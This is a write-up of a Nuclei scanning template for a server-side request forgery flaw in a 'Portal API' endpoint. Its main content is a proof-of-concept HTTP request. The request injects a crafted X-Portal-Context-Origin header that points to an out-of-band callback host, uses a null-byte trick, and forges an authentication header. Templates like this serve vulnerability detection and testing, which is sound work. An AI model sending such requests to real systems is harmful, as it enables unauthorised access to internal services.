# Nuclei Template: Portal API - Server Side Request Forgery
**Template ID:** portal-api-ssrf
**Vulnerability Class:** Server-Side Request Forgery (SSRF)
**Severity:** High
**CWE:** CWE-918
**Source:** Nuclei Template (`portal-api-ssrf.yaml`)

## Vulnerability Information & PoC

## Description
A Server-Side Request Forgery (SSRF) vulnerability in the Portal API endpoint by injecting a crafted X-Portal-Context-Origin header.

## Steps to reproduce / Exploit Payload
```http
GET /_proxy/api/v3/portal HTTP/1.1
Host: {{Hostname}}
X-Portal-Context-Origin: HttP://{{interactsh-url}}?%00
X-Portal-Session-Authenticated: true
```

## References
- https://owasp.org/www-community/attacks/Server_Side_Request_Forgery
